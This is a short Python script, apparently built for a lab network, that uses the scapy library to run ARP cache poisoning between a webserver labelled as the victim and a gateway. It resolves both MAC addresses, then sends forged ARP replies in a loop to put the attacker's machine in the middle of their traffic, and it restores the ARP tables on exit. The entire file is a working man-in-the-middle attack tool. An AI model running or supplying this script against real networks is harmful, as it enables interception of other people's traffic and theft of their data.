from scapy.all import ARP, send, sr, conf
import time
import sys

victim_ip = "172.28.0.3"     # Webserver
gateway_ip = "172.28.0.2"    # Router

def get_mac(ip):
    ans, _ = sr(ARP(pdst=ip), timeout=2, verbose=0)
    for _, rcv in ans:
        return rcv.hwsrc
    return None

def restore_network(victim_ip, victim_mac, gateway_ip, gateway_mac):
    print("\n[!] Ripristino rete...")
    send(ARP(op=2, pdst=victim_ip, hwdst="ff:ff:ff:ff:ff:ff",
             psrc=gateway_ip, hwsrc=gateway_mac), count=5, verbose=0)
    send(ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff",
             psrc=victim_ip, hwsrc=victim_mac), count=5, verbose=0)
    print("[+] Rete ripristinata.")

def arp_poison(victim_ip, victim_mac, gateway_ip, gateway_mac):
    try:
        print(f"[+] Avvio ARP poisoning tra {victim_ip} <-> {gateway_ip}")
        while True:
            # (target -> attacker)
            send(ARP(op=2, pdst=victim_ip, hwdst=victim_mac,
                     psrc=gateway_ip), verbose=0)
            # (gateway -> attacker)
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac,
                     psrc=victim_ip), verbose=0)
            time.sleep(10)
    except KeyboardInterrupt:
        restore_network(victim_ip, victim_mac, gateway_ip, gateway_mac)
        sys.exit(0)

if __name__ == "__main__":
    print("[*] Risoluzione MAC address...")
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)

    if not victim_mac or not gateway_mac:
        print("[-] Errore nel trovare gli indirizzi MAC. Assicurati che i target siano attivi.")
        sys.exit(1)

    arp_poison(victim_ip, victim_mac, gateway_ip, gateway_mac)
